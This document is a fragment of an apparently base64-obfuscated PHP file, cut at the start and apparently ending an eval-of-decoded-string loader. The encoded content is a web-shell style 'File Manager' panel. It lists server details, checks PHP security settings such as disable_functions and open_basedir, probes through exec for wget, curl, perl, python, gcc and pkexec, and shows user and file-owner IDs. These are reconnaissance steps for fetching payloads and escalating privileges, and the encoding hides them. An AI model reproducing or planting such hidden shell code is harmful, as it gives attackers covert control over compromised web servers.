WluZXIiPiA8aDI+RmlsZSBNYW5hZ2VyPC9oMj4gPD9waHAgc2hvd0JyZWFkY3J1bWIoJGN1cnJlbnREaXJlY3RvcnkpOyA/PiA8P3BocCBzaG93RmlsZVRhYmxlKCRjdXJyZW50RGlyZWN0b3J5KTsgPz4gPC9kaXY+CiAgICAgICAgPD9waHAgZW5kaWY7ID8+CgogICAgPC9kaXY+IDxkaXYgY2xhc3M9InNpZGViYXIiIGlkPSJzaWRlYmFyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJzaWRlYmFyLWNvbnRlbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJzaWRlYmFyLWNsb3NlIj4gPGJ1dHRvbiBvbmNsaWNrPSJ0b2dnbGVTaWRlYmFyKCkiPkNsb3NlICZ0aW1lczs8L2J1dHRvbj4gPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImluZm8tY29udGFpbmVyIj4gPGgyPlNlcnZlciBJbmZvPC9oMj4KICAgICAgICAgICAgICAgIDw/cGhwIGZ1bmN0aW9uIGNvdW50RG9tYWluc09uSVAoJGlwKSB7IHJldHVybiAnTi9BIChSZXF1aXJlcyBleHRlcm5hbCBsb29rdXApJzsgfSBmdW5jdGlvbiBmb3JtYXRCeXRlc0Rpc3BsYXkoJGJ5dGVzLCAkcHJlY2lzaW9uID0gMikgeyBpZiAoJGJ5dGVzID09PSBmYWxzZSB8fCAkYnl0ZXMgPCAwKSByZXR1cm4gJ04vQSc7ICR1bml0cyA9IGFycmF5KCdCJywgJ0tCJywgJ01CJywgJ0dCJywgJ1RCJywgJ1BCJyk7ICRieXRlcyA9IG1heCgkYnl0ZXMsIDApOyAkcG93ID0gZmxvb3IoKCRieXRlcyA/IGxvZygkYnl0ZXMpIDogMCkgLyBsb2coMTAyNCkpOyAkcG93ID0gbWluKCRwb3csIGNvdW50KCR1bml0cykgLSAxKTsgJGJ5dGVzIC89ICgxIDw8ICgxMCAqICRwb3cpKTsgcmV0dXJuIHJvdW5kKCRieXRlcywgJHByZWNpc2lvbikgLiAnICcgLiAkdW5pdHNbJHBvd107IH0gJHNlcnZlcklQQWRkciA9ICRfU0VSVkVSWydTRVJWRVJfQUREUiddID8/IChAZ2V0aG9zdGJ5bmFtZShAZ2V0aG9zdG5hbWUoKSkgPzogJ04vQScpOyAkZGlza1RvdGFsID0gQGRpc2tfdG90YWxfc3BhY2UoJy8nKTsgJGRpc2tGcmVlID0gQGRpc2tfZnJlZV9zcGFjZSgnLycpOyA/PgogICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJpbmZvLWxpc3QiPiA8bGk+SG9zdG5hbWU6IDw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycyhAZ2V0aG9zdG5hbWUoKSA/OiAnTi9BJyk7ID8+PC9saT4gPGxpPlNlcnZlciBJUDogPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKCRzZXJ2ZXJJUEFkZHIpOyA/PjwvbGk+IDxsaT5QSFAgVmVyc2lvbjogPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKEBwaHB2ZXJzaW9uKCkgPzogJ04vQScpOyA/PjwvbGk+IDxsaT5TZXJ2ZXIgU29mdHdhcmU6IDw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10gPz8gJ04vQScpOyA/PjwvbGk+IDxsaT5TeXN0ZW06IDw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycyhAcGhwX3VuYW1lKCkgPzogJ04vQScpOyA/PjwvbGk+IDw/cGhwIGlmICgkZGlza1RvdGFsICE9PSBmYWxzZSkgOiA/PjxsaT5IREQgVG90YWw6IDw/cGhwIGVjaG8gZm9ybWF0Qnl0ZXNEaXNwbGF5KCRkaXNrVG90YWwpOyA/PjwvbGk+PD9waHAgZW5kaWY7ID8+IDw/cGhwIGlmICgkZGlza0ZyZWUgIT09IGZhbHNlKSA6ID8+PGxpPkhERCBGcmVlOiA8P3BocCBlY2hvIGZvcm1hdEJ5dGVzRGlzcGxheSgkZGlza0ZyZWUpOyA/PjwvbGk+PD9waHAgZW5kaWY7ID8+IDxsaT5Eb21haW5zIG9uIElQOiA8P3BocCBlY2hvIGNvdW50RG9tYWluc09uSVAoJHNlcnZlcklQQWRkcik7ID8+PC9saT4gPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImluZm8tY29udGFpbmVyIj4gPGgyPlN5c3RlbSBGZWF0dXJlczwvaDI+CiAgICAgICAgICAgICAgICAgPHVsIGNsYXNzPSJpbmZvLWxpc3QiPgogICAgICAgICAgICAgICAgICAgICA8P3BocCBmdW5jdGlvbiBjaGVja0NvbW1hbmQoJGNvbW1hbmQpIHsgQGV4ZWMoImNvbW1hbmQgLXYgIiAuIGVzY2FwZXNoZWxsYXJnKCRjb21tYW5kKSAuICIgPi9kZXYvbnVsbCAyPiYxIiwgJG91dHB1dCwgJHJldHVybl92YXIpOyByZXR1cm4gJHJldHVybl92YXIgPT09IDA7IH0gJGZlYXR1cmVzID0gWyAnU2FmZSBNb2RlJyA9PiBAaW5pX2dldCgnc2FmZV9tb2RlJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPk9uPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+T2ZmPC9zcGFuPicsICdkaXNhYmxlX2Z1bmN0aW9ucycgPT4gIWVtcHR5KEBpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpKSA/ICc8c3BhbiBzdHlsZT0iY29sb3I6b3JhbmdlOyBmb250LXNpemU6MC45ZW07IiB0aXRsZT0iJyAuIGh0bWxzcGVjaWFsY2hhcnMoQGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJykpIC4gJyI+RXhpc3RzPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+Tm9uZTwvc3Bhbj4nLCAnYWxsb3dfdXJsX2ZvcGVuJyA9PiBAaW5pX2dldCgnYWxsb3dfdXJsX2ZvcGVuJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+T248L3NwYW4+JyA6ICc8c3BhbiBzdHlsZT0iY29sb3I6cmVkOyI+T2ZmPC9zcGFuPicsICdhbGxvd191cmxfaW5jbHVkZScgPT4gQGluaV9nZXQoJ2FsbG93X3VybF9pbmNsdWRlJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPk9uPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+T2ZmPC9zcGFuPicsICdtYWdpY19xdW90ZXNfZ3BjJyA9PiBmdW5jdGlvbl9leGlzdHMoJ2dldF9tYWdpY19xdW90ZXNfZ3BjJykgJiYgQGdldF9tYWdpY19xdW90ZXNfZ3BjKCkgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPk9uPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+T2ZmPC9zcGFuPicsICdyZWdpc3Rlcl9nbG9iYWxzJyA9PiBAaW5pX2dldCgncmVnaXN0ZXJfZ2xvYmFscycpID8gJzxzcGFuIHN0eWxlPSJjb2xvcjpyZWQ7Ij5Pbjwvc3Bhbj4nIDogJzxzcGFuIHN0eWxlPSJjb2xvcjpncmVlbjsiPk9mZjwvc3Bhbj4nLCAnb3Blbl9iYXNlZGlyJyA9PiAhZW1wdHkoQGluaV9nZXQoJ29wZW5fYmFzZWRpcicpKSA/ICc8c3BhbiBzdHlsZT0iY29sb3I6b3JhbmdlOyIgdGl0bGU9IicgLiBodG1sc3BlY2lhbGNoYXJzKEBpbmlfZ2V0KCdvcGVuX2Jhc2VkaXInKSkgLiAnIj5FeGlzdHM8L3NwYW4+JyA6ICc8c3BhbiBzdHlsZT0iY29sb3I6Z3JlZW47Ij5Ob25lPC9zcGFuPicsICdjVVJMJyA9PiBmdW5jdGlvbl9leGlzdHMoJ2N1cmxfaW5pdCcpID8gJzxzcGFuIHN0eWxlPSJjb2xvcjpncmVlbjsiPkVuYWJsZWQ8L3NwYW4+JyA6ICc8c3BhbiBzdHlsZT0iY29sb3I6cmVkOyI+RGlzYWJsZWQ8L3NwYW4+JywgJ1ppcEFyY2hpdmUnID0+IGNsYXNzX2V4aXN0cygnWmlwQXJjaGl2ZScpID8gJzxzcGFuIHN0eWxlPSJjb2xvcjpncmVlbjsiPkVuYWJsZWQ8L3NwYW4+JyA6ICc8c3BhbiBzdHlsZT0iY29sb3I6cmVkOyI+RGlzYWJsZWQ8L3NwYW4+JywgJ015U1FMaScgPT4gZnVuY3Rpb25fZXhpc3RzKCdteXNxbGlfY29ubmVjdCcpID8gJzxzcGFuIHN0eWxlPSJjb2xvcjpncmVlbjsiPkVuYWJsZWQ8L3NwYW4+JyA6ICc8c3BhbiBzdHlsZT0iY29sb3I6cmVkOyI+RGlzYWJsZWQ8L3NwYW4+JywgJ1BETycgPT4gY2xhc3NfZXhpc3RzKCdQRE8nKSA/ICc8c3BhbiBzdHlsZT0iY29sb3I6Z3JlZW47Ij5FbmFibGVkPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPkRpc2FibGVkPC9zcGFuPicsICd3Z2V0JyA9PiBjaGVja0NvbW1hbmQoJ3dnZXQnKSA/ICc8c3BhbiBzdHlsZT0iY29sb3I6Z3JlZW47Ij5ZZXM8L3NwYW4+JyA6ICc8c3BhbiBzdHlsZT0iY29sb3I6cmVkOyI+Tm88L3NwYW4+JywgJ2N1cmwgKGNtZCknID0+IGNoZWNrQ29tbWFuZCgnY3VybCcpID8gJzxzcGFuIHN0eWxlPSJjb2xvcjpncmVlbjsiPlllczwvc3Bhbj4nIDogJzxzcGFuIHN0eWxlPSJjb2xvcjpyZWQ7Ij5Obzwvc3Bhbj4nLCAncGVybCcgPT4gY2hlY2tDb21tYW5kKCdwZXJsJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+WWVzPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPk5vPC9zcGFuPicsICdweXRob24nID0+IGNoZWNrQ29tbWFuZCgncHl0aG9uJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+WWVzPC9zcGFuPicgOiAoY2hlY2tDb21tYW5kKCdweXRob24zJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+WWVzIChweTMpPC9zcGFuPicgOic8c3BhbiBzdHlsZT0iY29sb3I6cmVkOyI+Tm88L3NwYW4+JyksICdnY2MnID0+IGNoZWNrQ29tbWFuZCgnZ2NjJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+WWVzPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPk5vPC9zcGFuPicsICdwa2V4ZWMnID0+IGNoZWNrQ29tbWFuZCgncGtleGVjJykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPlllczwvc3Bhbj4nIDogJzxzcGFuIHN0eWxlPSJjb2xvcjpncmVlbjsiPk5vPC9zcGFuPicsICdnaXQnID0+IGNoZWNrQ29tbWFuZCgnZ2l0JykgPyAnPHNwYW4gc3R5bGU9ImNvbG9yOmdyZWVuOyI+WWVzPC9zcGFuPicgOiAnPHNwYW4gc3R5bGU9ImNvbG9yOnJlZDsiPk5vPC9zcGFuPicsIF07ID8+CiAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGZvcmVhY2ggKCRmZWF0dXJlcyBhcyAkZmVhdHVyZSA9PiAkc3RhdHVzKSA6ID8+IDxsaT48P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGZlYXR1cmUpOyA/PjogPD9waHAgZWNobyAkc3RhdHVzOyA/PjwvbGk+IDw/cGhwIGVuZGZvcmVhY2g7ID8+CiAgICAgICAgICAgICAgICAgPC91bD4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImluZm8tY29udGFpbmVyIj4gPGgyPlVzZXIgSW5mbzwvaDI+IDx1bCBjbGFzcz0iaW5mby1saXN0Ij4gPGxpPlVzZXJuYW1lOiA8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoQGdldF9jdXJyZW50X3VzZXIoKSA/OiAnTi9BJyk7ID8+PC9saT4gPGxpPlVzZXIgSUQgKFVJRCk6IDw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycyhAZ2V0bXl1aWQoKSA/OiAnTi9BJyk7ID8+PC9saT4gPGxpPkdyb3VwIElEIChHSUQpOiA8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoQGdldG15Z2lkKCkgPzogJ04vQScpOyA/PjwvbGk+IDxsaT5TY3JpcHQgT3duZXIgVUlEOiA8P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoQGdldG15aW5vZGUoKSA/IEBmaWxlb3duZXIoX19GSUxFX18pIDogJ04vQScpOyA/PjwvbGk+IDxsaT5DdXJyZW50IERpciBPd25lcjogPD9waHAgZWNobyBodG1sc3BlY2lhbGNoYXJzKEBmaWxlb3duZXIoJy4nKSA/OiAnTi9BJyk7ID8+PC9saT4gPC91bD4gPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxzY3JpcHQ+IGZ1bmN0aW9uIHRvZ2dsZVNpZGViYXIoKSB7IHZhciBzaWRlYmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NpZGViYXInKTsgc2lkZWJhci5jbGFzc0xpc3QudG9nZ2xlKCdvcGVuJyk7IH0gZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbihldmVudCkgeyB2YXIgc2lkZWJhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzaWRlYmFyJyk7IHZhciBtZW51SWNvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5tZW51LWljb24nKTsgaWYgKHNpZGViYXIuY2xhc3NMaXN0LmNvbnRhaW5zKCdvcGVuJykgJiYgIXNpZGViYXIuY29udGFpbnMoZXZlbnQudGFyZ2V0KSAmJiAhbWVudUljb24uY29udGFpbnMoZXZlbnQudGFyZ2V0KSkgeyBzaWRlYmFyLmNsYXNzTGlzdC5yZW1vdmUoJ29wZW4nKTsgfSB9KTsgLyogVGhlIGhhbmRsZUFjdGlvbkNoYW5nZSBmdW5jdGlvbiBpcyBpbmNsdWRlZCB3aXRoaW4gdGhlIHNob3dGaWxlVGFibGUgUEhQIGZ1bmN0aW9uIGFib3ZlLiAqLyA8L3NjcmlwdD4KPC9ib2R5Pgo8L2h0bWw+'));
?>
